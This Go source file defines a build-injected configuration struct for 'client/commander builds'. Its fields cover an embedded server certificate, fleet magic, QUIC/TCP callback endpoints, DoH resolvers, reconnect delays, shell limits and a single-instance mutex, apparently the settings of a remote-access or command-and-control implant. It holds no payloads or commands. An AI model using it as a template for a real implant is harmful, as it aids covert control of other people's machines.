// Package gen holds build-time injected configuration. builder.py
// regenerates config_gen.go; the committed version carries local dev
// defaults so plain `go build` always works.
package gen

// ConfigData is the injected configuration for client/commander builds.
type ConfigData struct {
	ServerCertPEM     string   // server cert embedded as code (trust anchor)
	Magic             string   // client fleet magic (min 16 chars)
	UDPServers        []string // client QUIC endpoints
	TCPServers        []string // client TCP fallback endpoints
	IPProtocol        string   // ipv4 | ipv6 | prefer-ipv6 | prefer-ipv4
	DNS               []string // plaintext resolvers (empty = system)
	DoH               []string // DoH URLs (empty = none)
	DNSAllowFallback  bool     // system DNS after all specified time out
	DNSTimeoutSec     int      // per-resolver timeout
	HandshakeTimeoutS int      // per-candidate dial window
	LoopDelaySec      int      // round cooldown per (server,transport)
	DelayStartSec     int      // wait before first round
	MaxShell          int      // 0 = unlimited
	MutexName         string   // single-instance mutex ("" = none)
}
